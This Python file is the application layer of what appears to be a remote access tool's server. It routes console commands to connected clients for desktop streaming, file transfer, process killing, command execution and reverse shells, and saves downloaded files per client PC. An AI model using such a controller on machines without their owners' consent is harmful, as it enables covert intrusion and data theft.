import os
import random
import string

from server.services.server import NetServerService
from server.ui.console.console_mediator import ConsoleUiMediator


class Application:

    def __init__(self):
        self.ui_mediator = ConsoleUiMediator(self)
        self.server = NetServerService(self)
        self.running = False

    def run(self):
        self.running = True
        self.server.start_async()
        self.ui_mediator.start_async()

        self.ui_mediator.main_loop()

    def list_connections(self):
        return self.server.get_clients()

    def get_client_info(self, client_id):
        self.server.request_client_info(client_id)

    def start_desktop_session(self, client_id):
        self.server.request_desktop(client_id)

    def stop_desktop_session(self, client_id):
        self.server.stop_desktop(client_id)

    def request_fs_entries(self, client_id, path):
        self.server.request_fs_entries(client_id, path)

    def download_file(self, client_id, path):
        self.server.try_download_file(client_id, path)

    def upload(self, client_id, path):
        self.server.upload_file(client_id, path)

    def get_process_list(self, client_id):
        self.server.request_process_list(client_id)

    def kill_process(self, client_id, pid):
        self.server.request_kill_process(client_id, pid)

    def exec(self, client_id, command):
        self.server.request_exec(client_id, command)

    def exec_piped(self, client_id, command):
        self.server.request_exec_piped(client_id, command)

    def get_reverse_shell(self, client_id):
        self.server.request_reverse_shell(client_id)

    def on_shell_data(self, client, result_op, packet):
        if result_op[0]:
            self.ui_mediator.packet_shell_received(client, packet)
        else:
            self.ui_mediator.show_error_message(client, 'Error on shell packet')

    def send_shell_command(self, client_id, command):
        self.server.send_shell_command(client_id, command)

    def on_file_downloaded(self, client, original_path, data):
        client_id = client['client_id']
        pc_name = client['pc_name']
        folder_name = '%s_%s' % (client_id, pc_name)
        if not os.path.exists("./downloads/%s" % folder_name):
            os.makedirs('./downloads/%s' % folder_name)

        filename = os.path.basename(original_path)
        if filename.strip() == '':
            filename = self.generate_random_string()
        filepath = './downloads/%s/%s' % (folder_name, filename)
        with open(filepath, 'wb') as fd:
            fd.write(data)
            self.ui_mediator.show_success_message('File saved: %s' % os.path.abspath(filepath))

    def on_file_entries_received(self, client, packet):
        self.ui_mediator.on_fs_data_received(client, packet)

    def on_client_connection(self, client_model):
        self.ui_mediator.on_new_client(client_model)

    def on_process_list(self, client_model, processes):
        self.ui_mediator.on_process_list_received(client_model, processes)

    def on_client_information(self, client_model, result_operation, info):
        if result_operation[0]:
            self.ui_mediator.client_info_received(client_model, info)
        else:
            self.ui_mediator.show_error_message(client_model, result_operation[1])

    def on_desktop_data(self, client, result_operation, image):
        if result_operation[0]:
            self.ui_mediator.on_desktop_data_received(client, image)
        else:
            self.ui_mediator.show_error_message(client, result_operation[1])

    @staticmethod
    def generate_random_string(str_length=16):
        return ''.join(random.choice(string.ascii_lowercase) for i in range(str_length))

    def on_client_disconnected(self, client):
        self.ui_mediator.on_client_disconnected(client)
